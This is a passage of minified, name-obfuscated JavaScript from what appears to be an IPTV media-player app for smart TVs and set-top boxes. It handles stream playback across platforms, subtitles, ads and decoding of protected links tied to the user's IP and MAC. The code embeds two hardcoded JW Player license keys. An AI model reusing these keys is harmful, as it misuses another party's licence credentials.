if(trackInfo[i].type=="TEXT"){if(Player.snum_start<0)Player.snum_start=i;Player.snum++}}},onsubtitlechange:function(duration,text,type,attriCount,attributes){clearTimeout(timerSub);$_("subtitle").style.display="block";lI1I1IxFCIh1l01llYpr("subtitle",text);timerSub=setTimeout('lI1I1IxFCIh1l01llYpr("subtitle","");',duration)},onstreamcompleted:function(){},oncurrentplaytime:function(currentTime){Player.cur_time=currentTime},ondrmevent:function(e,f){},onerror:function(e,f){}});kjtYpr.a_num=1;Player.tnum=1;kjtYpr.s_num=0;Player.snum=0;webapis.avplay.setDisplayRect(1292,675,628,405);try{webapis.avplay.prepareAsync(function(e){webapis.avplay.play();getVideoPlayInfo()},function(e){l1llOQI10lW1l_II101Ypr();kjtYpr.popUp(e.toString(),2500)})}catch(e){kjtYpr.popUp(e.toString(),2500)}}else if(uaJ=="dune"){setidprop("dune-api","mini");stb.play(playUrl)}else if(lIO1OIOlAQzl1Ol1lYpr=="media"){video.style.display="none";setidprop("jw","mini");$_("jw").style.display="block";if(uaJ=="lg"||uaJ=="lgw"||uaJ=="lgw2")var type="application/x-netcast-av";else type="video/mpeg";if(uaJ=="ph")type="application/vnd.apple.mpegurl";if((uaJ=="lg"||uaJ=="lgw"||uaJ=="lgw2")&&kjtYpr.series!="LW")var opt='onPlayStateChange="$_(\'loading\').style.display=\'none\';" preBufferingTime="8" ';else opt='';lI1I1IxFCIh1l01llYpr("jw",'<object type="'+type+'" '+opt+'data="'+playUrl+'" width="100%" height="100%" id="media" autostart="true" downloadable="false"></object>');media=$_("media");setTimeout("media.play(1);",200)}else if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){setidprop("video","mini");video=$_("video");video.style.display="block";$_("jw").style.display="none";video.src=playUrl;if(uaJ=="lg"||uaJ=="lgw"||uaJ=="lgw2")var type="application/x-netcast-av";else type="video/mp4";video.type=type;video.autoplay=!0;video.play()}else if(lIO1OIOlAQzl1Ol1lYpr=="jw"){try{$_("video").style.display="none";$_("jw").style.display="block";jwplayer.key="qcXu/ZrwbXbRPW/tm47rDKqkZXcp1nsBqUuuGEoWKok=";var jwtype=(is_m3u8(playUrl)==2?"m3u8":"m4v");console.log("JW start mini "+jwtype);jwplayer("jw").setup({"file":playUrl,type:jwtype,autostart:!0,androidhls:!1,hlsjsdefault:(jwtype=="mp4"?false:!0),stretching:optScreenJWE[kjtYpr.GL.xmode],"skin":{"url":_img("https://raw.githubusercontent.com/komivp/appinfodl/main/static/skin_mini.css"),"name":"myskin"}});setidprop("jw","mini")}catch(e){kjtYpr.popUp("Error JW<br><br>"+e.message,4000)}}}},40)}catch(e){console.log(e);kjtYpr.popUp(e.message,5000)}}
function replaceArray(s,find,replace){var replaceString=s;for(var i=find.length-1;i>=0;i--){replaceString=replaceString.replace(find[i],replace[i]);replaceString=replaceString.replace(find[i],replace[i]);replaceString=replaceString.replace(find[i],replace[i]);replaceString=replaceString.replace(find[i],replace[i])}
return replaceString};function replaceArrayG(s,find,replace){var replaceString=s;for(var i=find.length-1;i>=0;i--){while(replaceString.indexOf(find[i])!=-1)replaceString=replaceString.replace(find[i],replace[i]);}
return replaceString};function parse_urld(u){var f=["shtorm","tv","live",".m3u8","hls","streaming","udp",":1",":8"];var t=["shipset","fp_tv","fp_live","_translation.m3u8","live_hlsstream","streamtving","live/udp/xy",":8081/streamudp/",":8088/streamudp/"];return replaceArray(u,t,f)}
function parse_urlm(u,m){var orig_u=u;u=u.replace(".m3u8","");console.log("parse_urlm "+u);if(u.indexOf("/hls/userencrypt/")>0){u=u.split("/hls/userencrypt/")[1];var t=["aHR0cDovL","=","S","z","M","b","1"];var md=md5(ipG+kjtYpr.mac);var f=[];for(var i=0;i<7;i++)f[i]=md.substr(i*4,4);var s=replaceArrayG(u,f,t);var p=atob(s).split("-9-");console.log(p);if(typeof p[1]=="undefined"){kjtYpr.popUp("Error decode link! Please restart application. Your ip: "+ipG,2000);return""}else if(p[1].indexOf(gP().lIQ0Il1IlIb1Il1OYpr.split("#CAT=")[0])==0&&p[1].indexOf(kjtYpr.mac)>0)return p[0];else{kjtYpr.popUp("Error decode this link! Please restart application. Your ip: "+ipG,2000);return""}}else{u=u.substr(28);var f=["shorted","translation","5HtRyF","6TrEdS","LKKfr","LJJlMn","HGGffR"];var t=["aHR0cDovL","=","S","F","M","b","0"];var s=replaceArrayG(u,f,t);p=atob(s).split("-9-")}
if(m)return p[0];if(typeof p[3]!="undefined"){}
if(typeof p[1]!="undefined"){if(p[1].indexOf(gP("lIQ0Il1IlIb1Il1OYpr"))==0&&p[1].indexOf(kjtYpr.mac)>0)return p[0];else return orig_u}
return p[0]}
function imgonload(t){videoLoad("off",Math.random());statusbar("off");console.log(t.width);var x=t.width;var y=t.height;var ratioX=x/innerW;var ratioY=y/innerH;if(y/ratioX>720)t.height=y/ratioY;else t.width=x/ratioX;t.style.visibility='visible';if(l0I110IO1SyqII1lI1Ypr&&$_("vk_audio").style.zIndex=="0"){$_("vk_audio").style.zIndex="-5";$_("vk_audio").style.display="none"}}
var slideTimer,slide_mode=5000,timeoutWork,listener;function startslide(){clearTimeout(slideTimer);slideTimer=setTimeout(function(){console.log(handler);if(parseInt(getSelect())+1<gP().channels.length){oInset[insetActive].focused(parseInt(getSelect())+1);if(is_img(curCh("stream_url"))||curCh("type")=="img"){$_("jwmedia").src=curCh("stream_url");startslide()}else l1llOQI10lW1l_II101Ypr()}else{if(parseInt(kjtYpr.GL.next)==3){setSelect(-1);startslide()}else l1llOQI10lW1l_II101Ypr()}},slide_mode)}
function eventerrvideo(){if(is_rek&&rek_url!=""){console.log(event);err_rek("errloadfile"+uaJ);return}
if(handler=="menu"||rek_url!=""||terminated)return;if(getCur()==0)gP().sendStat(0);if(kjtYpr.GL.timeoutiptv>55)return;if((!pstream||is_vod(playUrl))&&getCur()>0){setTimeout("easystop();	renderPlayer(); l0OIQIl1OI0IlI0lIYpr('"+playUrl+"',true,"+getCur()+");",2500);lI010lp_Z1l1O0Ypr("_FPSoedineniePrervano_!"+getCur()+playUrl);return}
iptv_retry++;if(pstream&&!is_vod(playUrl)&&iptv_succed){easystop(1);renderPlayer();setTimeout("l0OIQIl1OI0IlI0lIYpr(playUrl,true);",500);lI010lp_Z1l1O0Ypr("_FPOshibka_! _FPPodkluchenie_ "+iptv_retry+"...");return}
if(iptv_retry>3){l1llOQI10lW1l_II101Ypr()}else{if(!plmini_on){t=" _FPpodklucheniya_";lifeN=0;lifeSec=-1;videoLoad("on");easystop(1);renderPlayer();playUrl=streamnum(playElement.url,1);l0OIQIl1OI0IlI0lIYpr(playUrl,!0);lI010lp_Z1l1O0Ypr("_FPOshibka_"+t+"! _FPPodkluchenie_  "+(iptv_retry+1)+"...")}}}
var stp="",fhd=!1,sound=null,soundt=null,soundn=0;function audioplay(url){if(url.indexOf("http")!=0||(handler!="player"&&handler!="qual")||stopped||playUrlAudio=="")return;try{sound=new Audio(playUrlAudio);sound.addEventListener("error",function(e){kjtYpr.popUp("Audio err: "+e.currentTarget.error.code,500);if(e.currentTarget.error.code>1&&e.currentTarget.error.code<4){sound=null;clearTimeout(soundt);soundt=setTimeout("audioplay(playUrlAudio);",1500)}});sound.load();sound.addEventListener('loadedmetadata',function(){console.log('loadedmetadata');if(!stopped){soundn=2;sound.currentTime=getCur();sound.play()}},!1)}catch(e){kjtYpr.popUp("Not support js audio<br>"+e.message,1200)}}
var rek_curtime=0,rek_totaltime=0,rek_curtimeint,rek_sel=1;function rekBox(text,rek_curtime){if(is_rek){$_("playerBottom").style.height=css_wh(20)+"px";$_("playerBottom").style.top=css_wh(innerH-11)+"px";if(rek_sel<0)rek_sel=1;else if(rek_sel>1)rek_sel=0;if(text!=null){$_("rek_button2").style.display="block";lI1I1IxFCIh1l01llYpr("rek_button2",text)}else if(Point["ClickThrough"]!=""&&typeof Point["linkTxt"]!="undefined"&&rek_type!="buzolla"){$_("rek_button1").style.display="block";if(Point["linkTxt"].split("%").length>4)Point["linkTxt"]=decodeURI(Point["linkTxt"]);lI1I1IxFCIh1l01llYpr("rek_button1","<b>Перейти по ссылке</b><br>"+Point["linkTxt"])}else $_("rek_button1").style.display="none";if($_("rek_button1").style.display=="none")rek_sel=1;if(rek_sel==0){$_("rek_button1").style.border="4px solid white";$_("rek_button2").style.border="1px solid gray"}else if(rek_sel==1){$_("rek_button1").style.border="1px solid gray";$_("rek_button2").style.border="4px solid white"}}else{}}
var plDesc=0;function l0OIQIl1OI0IlI0lIYpr(url,m,start,jwtype){console.log("orig="+url);if(start==null)startM=0;try{if(url.indexOf("md5hash")!=-1){is_loadpage(-1);l1llOQI10lW1l_II101Ypr(!0);kjtYpr.inf("Unparsed md5hash, _FPNeobhodimRemoteFork_",2000);if(kjtYpr.GL.remote>0)l0OI10IRge011lO1Ypr();return}
var curPage=gP();is_loadpage(0);showPlayer();triggerHide();if(url=="description"){plDesc=0;$_("loading").style.display="none";lI1I1IxFCIh1l01llYpr("infPl","TEXT");console.log("IS DESC");playUrl=url;paused=!1;video.style.display="none";$_("jw").style.display="block";var b="<div style='background-color:#ccc;padding:15px;'>"+playElement.description+"</div>";lI1I1IxFCIh1l01llYpr("jw",b);statusbar("off");return}else if(is_img(url)||gV(playElement,"type")=="img"){console.log("IS IMG");playUrl=url;if(url.indexOf("image/")==0)url=url.substr(6);paused=!1;console.log("is img "+url);video.style.display="none";$_("jw").style.display="block";lI1I1IxFCIh1l01llYpr("infPl","IMAGE");var b="<div style='width:100%;height:100%;text-align:center;background-color:black;'><img id='jwmedia' style='visibility:hidden;' onload='imgonload(this);' src='"+url+"' align='center' /></div>";lI1I1IxFCIh1l01llYpr("jw",b);if(rek_url=="")startslide();else if(is_rek){rekBox();if(Point["Duration"]!=""&&!isNaN(Point["Duration"]))rek_totaltime=Point["Duration"];else rek_totaltime=3;if(rek_totaltime>600)rek_totaltime=600;rek_curtime=0;rek_curtimeint=setInterval("console.log('rekimg interval '+rek_curtime); if(is_rek) getVideoPlayInfo(++rek_curtime,"+rek_totaltime+"); else clearInterval(rek_curtimeint);",1000)}
return}else rekBox();try{if(l0I110IO1SyqII1lI1Ypr){if($_("vk_audio").style.display=="block"){$_("vk_audio").style.zIndex="-2";$_("vk_audio").style.display="none";$_("vk_play_button").style.display="block";vk_audio_stop()}}
l0I1lljnfqdllllOIYpr()}catch(e){}
lastViewUrl2=lastViewUrl;lastViewUrl=url;if(url.indexOf("sess-")>0)url=url.replace(/\/sess-.{38}\//,"/videos/");if(url.indexOf("udp://")==0&&kjtYpr.GL.udp!=""&&kjtYpr.GL.udp!=undefined){url=url.replace("udp://@","http://"+kjtYpr.GL.udp+"/udp/").replace("udp://","http://"+kjtYpr.GL.udp+"/udp/")}
if(url.indexOf("rtp://")==0&&kjtYpr.GL.udp!=""&&kjtYpr.GL.udp!=undefined){url=url.replace("rtp://@","http://"+kjtYpr.GL.udp+"/rtp/").replace("rtp://","http://"+kjtYpr.GL.udp+"/rtp/")}
if(uaJ=="mag"&&url.indexOf("ffrt")==-1&&is_m3u8(url))url="ffrt2 "+url;if(url.indexOf("acestream://")==0){url="http://"+getip("acestream")+"/ace/manifest.m3u8?id="+url.replace("acestream://","")+""}
if(url.indexOf("#AUDIO=")>0){playUrl=url.split("#AUDIO=")[0];playUrlAudio=url.split("#AUDIO=")[1];audioplay(playUrlAudio)}else playUrl=url;end_ok=!1;paused=!1;stopped=!1;curTime=0;terminated=!1;if(url.indexOf("/opt")==0){}else if(url.indexOf("/dtv/usb/")==0){url=url.replace("$USB_DIR/")}else if(url.indexOf("/")==0&&platform=="android-device"&&!lIO1OIOlAQzl1Ol1lYpr.match(/manual|media|vimu/)){console.log("andr url="+url)}else if(url.indexOf("/")==-1){l1llOQI10lW1l_II101Ypr();kjtYpr.inf("_FPNevernayaSsilka_",1200);return}
if(rek_url==""){clearTimeout(timeoutWork);timeoutWork=setTimeout(function(){if((curTime==0||isNaN(curTime))&&(totalTime==0||isNaN(totalTime)))gP().sendStat(0)},28000)}
console.log("XU = "+curPage.lIQ0Il1IlIb1Il1OYpr);console.log("lIO1OIOlAQzl1Ol1lYpr = "+lIO1OIOlAQzl1Ol1lYpr);console.log("is_m3u8(playUrl) = "+is_m3u8(playUrl));console.log(url);sethash(playUrl);if(lIO1OIOlAQzl1Ol1lYpr=="playerjs"){$_("video").style.display="none";$_("jw").style.display="block";if(gV(playElement,"type")=="iframe"){lI1I1IxFCIh1l01llYpr("jw",'<iframe id="playerjs2" style="z-index:2;height:100%;width:100%;margin:0px; padding:0px;" allow="autoplay" sandbox="allow-scripts allow-same-origin" frameborder="0" '+'src=\'javascript:d=document;d.clear();\'></iframe>');setTimeout(function(){$_("playerjs2").src="javascript:d=document;d.clear();d.open();"+"d.write(\"<!DOCTYPE html><html>"+"<body style=\\\"width:"+innerW+"px;height:"+innerH+"px;overflow: hidden;\\\">"+"<script>"+"var $=parent.$;"+"function jwonload(){parent.$_(\\\"jw\\\").style.zIndex=\\\"2\\\";setTimeout(\\\"parent.uplayer[parent.lIO1OIOlAQzl1Ol1lYpr].play();\\\",5500);parent.statusbar(\\\"off\\\");}"+"</script>"+"<iframe onload=\\\"jwonload();\\\" allow=\\\"autoplay\\\" sandbox=\\\"allow-scripts allow-same-origin\\\" style=\\\"width:100%;height:100%;margin: 0px; border:none;\\\" id=\\\"playerjs\\\" src=\\\""+url.replace("#playerjs","")+"\\\" />"+"</body>"+"</html>\");d.close();"},150)}else lI1I1IxFCIh1l01llYpr("jw","<iframe allow='autoplay' onload='$_(\"jw\").style.zIndex=\"2\";setTimeout(\"uplayer[lIO1OIOlAQzl1Ol1lYpr].play();\",9500); ' style='width:100%;height:100%;margin-top: 0px; border:none;' id='playerjs' src='"+url.replace("#playerjs","")+"' />")}else if(lIO1OIOlAQzl1Ol1lYpr=="jw"){try{$_("video").style.display="none";$_("jw").style.display="block";jwplayer.key="HY8B2VALIOA/I+mqBXK+3/Jz9OQkc+4GJMvoKWJoV8GFT9Dr";if(jwtype==null)jwtype=(is_m3u8(playUrl)==2?"m3u8":"m4v");console.log("JW start  "+jwtype);lI010lp_Z1l1O0Ypr("jws:"+jwtype);function getJWtype(){if(typeof curPage.global.allvast=="object")return null;else return jwtype}
function getJWadv(){if(typeof curPage.global.allvast=="object")return curPage.global.allvast;else return{}}
jwplayer("jw").setup({"file":url,"height":"100%","width":"100%","type":getJWtype(),"autostart":!0,"androidhls":!1,"hlsjsdefault":(jwtype=="mp4"?false:!0),"stretching":optScreenJWE[kjtYpr.GL.xmode],"skin":{"url":_img("https://raw.githubusercontent.com/komivp/appinfodl/main/static/skin.css"),"name":"myskin"},"advertising":getJWadv()});jwplayer().on('firstFrame',function(){console.log("firstFrame "+start);statusbar("off");if(start!=null)jwplayer("jw").seek(start)});jwplayer("jw").on("adBreakEnd",function(event){});jwplayer("jw").on('complete',function(){console.log("jw complete");endvideo()});jwplayer("jw").on('time',function(){getVideoPlayInfo()});jwplayer("jw").on("error",function(event){console.log(event);html5error(event)});jwplayer("jw").on("setupError",function(event){console.log("jw setupError");console.log(event.message);if(event.message=="No playable sources found"&&jwtype!="mp4"){l0OIQIl1OI0IlI0lIYpr(playUrl,!0,null,"mp4")}else html5error(event)});jwplayer("jw").on("all",function(event){});jwplayer("jw").on("buffer",function(b){console.log("jw buffer");console.log(b);buffering()});setidprop("jw",0)}catch(e){kjtYpr.popUp("Error JW<br><br>"+e.message,4000)}}else if(platform=="sams"&&lIO1OIOlAQzl1Ol1lYpr=="media"){if(gV(playElement,"chat").indexOf("http")==0){$_("chat").style.display="block";setTimeout(function(){if($_("chat").innerHTML.indexOf(playElement.chat)==-1)lI1I1IxFCIh1l01llYpr("chat","<iframe src='"+playElement.chat+"' width=280 height=720></iframe>")},12000)}else{$_("chat").style.display="none"}
iptv_succed=!1;$_("video").style.display="none";$_("jw").style.display="none";if(kjtYpr.mac=="38d5471983da")return;pluginAPI.setOffScreenSaver();pluginAPI.setOffIdleEvent();Player.w=0;Player.h=0;Player.change=!1;if(is_m3u8(playUrl)==2&&-1===playUrl.indexOf("COMPONENT=HLS")){playUrl+="|COMPONENT=HLS"}
if(Player.Sef){Player.SefPlugin.Execute('SetDisplayArea',0,0,960,540)}else{Player.plugin.SetDisplayArea(0,0,960,540)};kjtYpr.a_num=1;Player.tnum=1;if(playUrl.indexOf('.mp3')==-1){Player.SetBuffer()}
if(!plmini_on){if(Player.Sef){console.log("sef player:");if(start==null)start=0;Player.SEFPlay(playUrl,start)}else{if(kjtYpr.series=="C"){console.log("c plugin player:"+playUrl);Player.plugin.Play(playUrl)}else{console.log("d plugin player:");Player.plugin.InitPlayer(playUrl);if(Player.get3DMode()!=0){Player.plugin.SetPlayerProperty('2','3',Player.get3DMode())}else{if(playUrl.indexOf('.mp3')>0){Player.plugin.SetPlayerProperty('2','0','0')}}
if(kjtYpr.GL.timeoutiptv>49)Player.plugin.SetInitialTimeOut(kjtYpr.GL.timeoutiptv);Player.plugin.StartPlayback()}}
lI010lp_Z1l1O0Ypr("_FPPodkluchenie_.")}else{$_("bcg1").style.display="none";$_("bcg2").style.display="none";console.log("bcg off");plmini_on=!1;Player.setSize(kjtYpr.GL.xmode)}}else{if(uaJ=="dune"&&lIO1OIOlAQzl1Ol1lYpr=="media"){try{setidprop("dune-api",0);if(plmini_on){plmini_on=!1;return}
console.log("jw none");$_("dune-api").style.zIndex="1";$_("video").style.display="none";$_("jw").style.display="none"}catch(e){console.log(e);kjtYpr.popUp("Error 1<br>"+e.message,4000)}
triggerHide();stb.play(url);magpropv();return}
if(uaJ=="mag"&&lIO1OIOlAQzl1Ol1lYpr=="media"){$_("video").style.display="none";$_("jw").style.display="none";if(start)startM=start;try{stb.SetCustomHeader('User-Agent: '+ua_chrome)}catch(e){console.log(e);kjtYpr.popUp(e.message,1500)}
stb.Play(url);stb.SetPIG(1,0,0,0);magpropv();return}
if(platform=="android-device"&&lIO1OIOlAQzl1Ol1lYpr.match(/manual|media|vimu/)){if(kjtYpr.build>=7){var ex={"type":"video","player":lIO1OIOlAQzl1Ol1lYpr,"header":{},"title":gV(playElement,"title"),"url":url};if($_("epg_full").style.display!="none")ex.title=$_("epg_full").innerHTML.replace(/<br>/g,"\n").replace(/<.*?>/g,"");andr.exec(llIl1I1HlMgNII1IO0Ypr(ex))}else{andr.cmd("video"+url)}
return}
if(lIO1OIOlAQzl1Ol1lYpr=="tizen"){try{$_("video").style.display="none";$_("jw").style.display="none";setidprop("av-player",0);$_("av-player").style.display="block";$_("av-player").onmousemove=function(event){showPlayer();triggerHide()};if(!plmini_on){try{webapis.avplay.stop();webapis.avplay.open(url)}catch(e){kjtYpr.popUp("Error 1<br>"+e.message,4000)}
webapis.avplay.setListener({onbufferingstart:function(){iptv_succed=1;lI010lp_Z1l1O0Ypr("_FPZagruzka_.")},onbufferingprogress:function(per){lifeN=0;videoLoad("on",getCur());if(playUrlAudio!="")sound.pause();lI010lp_Z1l1O0Ypr("_FPZagruzka_. "+per+"%")},onbufferingcomplete:function(){lI010lp_Z1l1O0Ypr("");videoLoad("off",Math.random());var trackInfo=webapis.avplay.getTotalTrackInfo();Player.tnum=0;Player.snum=0;Player.tnum_start=-1;Player.snum_start=-1;for(var i=0;i<trackInfo.length;i++){if(trackInfo[i].type=="AUDIO"){if(Player.tnum_start<0)Player.tnum_start=i;Player.tnum++}
if(trackInfo[i].type=="TEXT"){if(Player.snum_start<0)Player.snum_start=i;Player.snum++}}
setTimeout("setProp("+kjtYpr.GL.xmode+");",300);triggerHide(600)},onsubtitlechange:function(duration,text,type,attriCount,attributes){clearTimeout(timerSub);$_("subtitle").style.display="block";lI1I1IxFCIh1l01llYpr("subtitle",text);timerSub=setTimeout('lI1I1IxFCIh1l01llYpr("subtitle","");',duration)},onstreamcompleted:function(){setTimeout("setProp("+kjtYpr.GL.xmode+");",300)},oncurrentplaytime:function(currentTime){Player.cur_time=currentTime},ondrmevent:function(e,f){},onerror:function(e,f){kjtYpr.popUp("Err video:"+e.toString()+f.toString(),2500);eventerrvideo()}});kjtYpr.a_num=1;Player.tnum=1;kjtYpr.s_num=0;Player.snum=0}else{$_("bcg1").style.display="none";$_("bcg2").style.display="none";console.log("bcg off")}
webapis.avplay.setDisplayRect(0,0,1920,1080);if(!plmini_on){try{webapis.avplay.prepareAsync(function(e){webapis.avplay.play();getVideoPlayInfo();webapis.avplay.setSilentSubtitle(!0)},function(e){lI010lp_Z1l1O0Ypr("Error: "+e.toString());eventerrvideo()})}catch(e){kjtYpr.popUp(e.toString(),2500)}}else plmini_on=!1}catch(e){}}
console.log("load data src lIO1OIOlAQzl1Ol1lYpr="+lIO1OIOlAQzl1Ol1lYpr);if(lIO1OIOlAQzl1Ol1lYpr=="download"){document.location=url;return}
try{if(lIO1OIOlAQzl1Ol1lYpr=="media"){setidprop("jw",0);try{setidprop("media",0)}catch(e){}}else setidprop("video",0);if(plmini_on){plmini_on=!1;return}
if(lIO1OIOlAQzl1Ol1lYpr=="extmedia"||lIO1OIOlAQzl1Ol1lYpr=="exthtml5"){prev[curPage.lIQ0Il1IlIb1Il1OYpr].select=select;kjtYpr.lll0Il11OxICbl1ll0Ypr("prev",llIl1I1HlMgNII1IO0Ypr(prev));document.location=fshomeurl+"?pmo"+"de="+lIO1OIOlAQzl1Ol1lYpr.substr(3)+"&extmode&video="+escape(url);return}else if(lIO1OIOlAQzl1Ol1lYpr=="media"||lIO1OIOlAQzl1Ol1lYpr=="ext"){if(gV(playElement,"chat").indexOf("http")==0){setidprop("jw",1);$_("chat").style.display="block";setTimeout(function(){if($_("chat").innerHTML.indexOf(playElement.chat)==-1)lI1I1IxFCIh1l01llYpr("chat","<iframe src='"+playElement.chat+"' width=280 height=720></iframe>")},12000)}else{$_("chat").style.display="none";setidprop("jw",0)}
if(plmini_on){try{media.play(0)}catch(e){}
lI1I1IxFCIh1l01llYpr("playermini","");$_("playermini").style.display="none";$_("bcg1").style.display="none";$_("bcg2").style.display="none";plmini_on=!1}
video.style.display="none";$_("jw").style.display="block";if(pstream&&(uaJ=="lg"||uaJ=="lgw"||uaJ=="lgw2"))var type="application/x-netcast-av";else type="video/mpeg";if((uaJ=="lg"||uaJ=="lgw"||uaJ=="lgw2")&&kjtYpr.series!="LW")var opt='onPlayStateChange="$_(\'loading\').style.display=\'none\';" preBufferingTime="8" ';else opt='';var chl=kjtYpr.l1O0l1gmmv01O11Ypr("mlang");if(chl!="")if(typeof optLang[chl]!="undefined")if(chl>0){optLangSel=chl;opt+=' audioLanguage="'+optLang[optLangSel]+'"'}
if(uaJ=="ph"){if(pstream)type="application/vnd.apple.mpegurl"}
lI1I1IxFCIh1l01llYpr("jw",'<object type="'+type+'" '+opt+'data="'+url+'" width="100%" height="100%" id="media" autostart="true" downloadable="false"></object>');media=$_("media");setTimeout("media.play(1);",200)}else if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){if(gV(playElement,"chat").indexOf("http")==0){setidprop("video",1);$_("chat").style.display="block";setTimeout(function(){if($_("chat").innerHTML.indexOf(playElement.chat)==-1)lI1I1IxFCIh1l01llYpr("chat","<iframe src='"+playElement.chat+"' width=280 height=720></iframe>")},12000)}else{$_("chat").style.display="none";setidprop("video",0)}
if(plmini_on){video.src="";lI1I1IxFCIh1l01llYpr("playermini","");$_("playermini").style.display="none";$_("bcg1").style.display="none";$_("bcg2").style.display="none";plmini_on=!1}
if(pstream&&(uaJ=="lg"||uaJ=="lgw"||uaJ=="lgw2"))var type="application/x-netcast-av";else if(pstream)type="application/vnd.apple.mpegurl";else type="video/mp4";if(uaJ=="lgw"||uaJ=="lgw2"){var options={};options.option={};options.option.subtitle={"show":!1};var mediaOption=escape(JSON.stringify(options))}
console.log("type="+type);if(uaJ=="sharp"&&pstream){type="application/vnd.apple.mpegurl";lI010lp_Z1l1O0Ypr("Sharp iptv stream!")}
if(ua.match(/sony/))type="video/mpeg";if(url.indexOf(".mp3")>0&&uaJ!="lg"&&uaJ!="lgw"&&uaJ!="lgw2")type="audio/mpeg";if(lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){video.style.display="none";$_("jw").style.display="none";$_("other").style.display="block";setidprop("other",0);var ad2=" style=\\\"position:fixed;top:0px;left:0px;width:100%;height:100%;\\\"";var st="<iframe style='display:block;background-color:black;position:absolute;top:0px;left:0px;border:none;margin:0px;padding:0px;' width='100%' height='100%' id='piframe' "+"src='javascript:d=document;d.clear();d.open();"+"d.write(&quot;&lt;html&gt;&lt;head&gt;    &lt;meta name=\\\"viewport\\\" content=\\\"width=100%,height=100%\\\"&gt;    &lt;/head&gt;&lt;body style=\\\"width:100%;height:100%;overflow:hidden;margin:0px;padding:0px;\\\"&gt;"+"&lt;video id=\\\"piframevideo\\\""+ad2+" autoplay=true type=\\\""+type+"\\\" src=\\\""+url+"\\\"&gt; &lt;/video&gt;"+"&lt;script&gt;"+"var video=document.getElementById(\\\"piframevideo\\\");"+"var fst=0;"+"video.addEventListener(\\\"timeupdate\\\",function(){"+"var hash=window.location.hash.split(\\\"-\\\");"+"if(hash[0]==\\\"rewind\\\"){video.currentTime=hash[1];}"+"window.location.hash=\\\"\\\";"+"window.top.getVideoPlayInfo(video.currentTime,video.duration);"+"});"+"function buffering(){window.top.buffering(video.buffered.end(0)/video.duration);}"+"video.addEventListener(\\\"error\\\", function(event){window.top.html5error(event);});"+"video.addEventListener(\\\"progress\\\", function(){buffering();});"+"video.onmousemove=function(event){window.top.showPlayer();window.top.triggerHide();};	"+"document.addEventListener(\\\"keydown\\\",window.top.keyHandlerPress,false);"+"&lt;/script&gt;"+"&lt;/body&gt;&lt;/html&gt;&quot;);d.close();'>";console.log(st);lI1I1IxFCIh1l01llYpr("other",st);setTimeout(function(){video=$_("piframe").contentWindow.piframevideo;console.log("video=");console.log(video);if(video==null){videoLoad("off",-1);video=$_("video")}},300)}else{video=$_("video");if(start==null){video.addEventListener('loadedmetadata',function(){clearTimeout(errauto);if((platform=="tizen"||uaJ=="pa"||uaJ=="sony"||uaJ=="sharp"||platform=="android-device")&&kjtYpr.GL.xmode>0){setVideoResolution();video.play()}else video.play();lI010lp_Z1l1O0Ypr("")},!1)}else video.addEventListener('loadedmetadata',function(){clearTimeout(errauto);if((platform=="tizen"||uaJ=="pa"||uaJ=="sony"||uaJ=="sharp"||platform=="android-device")&&kjtYpr.GL.xmode>0){setVideoResolution();video.play()}else video.play();lI010lp_Z1l1O0Ypr("");this.currentTime=start},!1);video.src=url;video.style.display="block";$_("jw").style.display="none";try{video.load()}catch(e){console.log(e)}
video.type=type;video.autoplay=!0;if(platform=="android-device"){video.addEventListener("click",function(){video.play();setVideoResolution();console.log("play")})}else{video.play()}}}
if(kjtYpr.l1l0OIlxII1l1IIYpr>0){video.style.display="none";$_("jw").style.display="none"}
fst=!0;if(uaJ=="pa"&&!1){if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5")launchFullScreen(video);else launchFullScreen(media)}
setWhitestripes();if(gV(playElement.event,"onstartvideo")!=""){var myImage=new Image(1,1);myImage.src=addident(playElement.event.onstartvideo)}}catch(e){console.log(e);kjtYpr.inf("_FPOshibka_ URL")}}}catch(e){console.log(e);kjtYpr.popUp("Play "+url.substr(0,15)+"...<br>"+e.message,5000)}}
function setidprop(id,n){if(n==-1){$_(id).style.top="0px";$_(id).style.left="0px";$_(id).style.width="0px";$_(id).style.height="0px"}else if(n==0){$_(id).style.top="0px";$_(id).style.left="0px";getwh();$_("subtitle").style.width="90%";$_("subtitle").style.top="80%";$_("subtitle").style.fontSize=css_wh(40)+"px";$_("subtitle").style.left="5%";$_(id).style.width=innerW+"px";$_(id).style.height=innerH+"px"}else if(n==1){$_(id).style.top="0px";$_(id).style.left="0px";$_(id).style.width="1000px";$_(id).style.height="100%"}else{$_(id).style.top="63%";$_(id).style.left="67%";$_(id).style.width="32%";$_(id).style.height="37%"}}
Player.get3DMode=function(){try{if(this.Screen3Dplugin!=null){if(1==this.Screen3Dplugin.Flag3DEffectSupport()||this.Screen3Dplugin.Flag3DTVConnect()==1){return this.mode3D}else{return 0}}}catch(e){return 0}};Player.change3DMode=function(x_mode){if(this.Screen3Dplugin!=null){this.mode3D=x_mode;this.status3D='';if(1==this.Screen3Dplugin.Flag3DEffectSupport()||this.Screen3Dplugin.Flag3DTVConnect()==1){switch(x_mode){case 0:this.status3D='3D OFF';break;case 1:this.status3D='SIDE-BY-SIDE';break;case 2:this.status3D='TOP-BOTTOM';break};if(kjtYpr.seriesC){if(this.Screen3Dplugin.Check3DEffectMode(x_mode)==1){this.Screen3Dplugin.Set3DEffectMode(x_mode)}}else{Player.play(Player.url,0)}};lI010lp_Z1l1O0Ypr(this.status3D)}else lI010lp_Z1l1O0Ypr("3D _FPnePodderzhivaetsya_!")};var abf=[0.05,0.1,0.2,0.3,0.5,0.7,1,1.2,1.8,2.5,3,4,5,6,7,8,9,10,13,15,20];Player.SetBuffer=function(buf){kjtYpr.GL.timeout=30;if(buf==null)buf=parseInt(kjtYpr.GL.buffer);if(buf>20)buf=20;else if(buf<1)buf=1;if(buf<=17)var all_buf=10;else all_buf=20;var x_buf=parseInt((all_buf*1048576),10);var x_ibuf=parseInt((abf[buf]*1048576),10);if(rek_url!=""){}
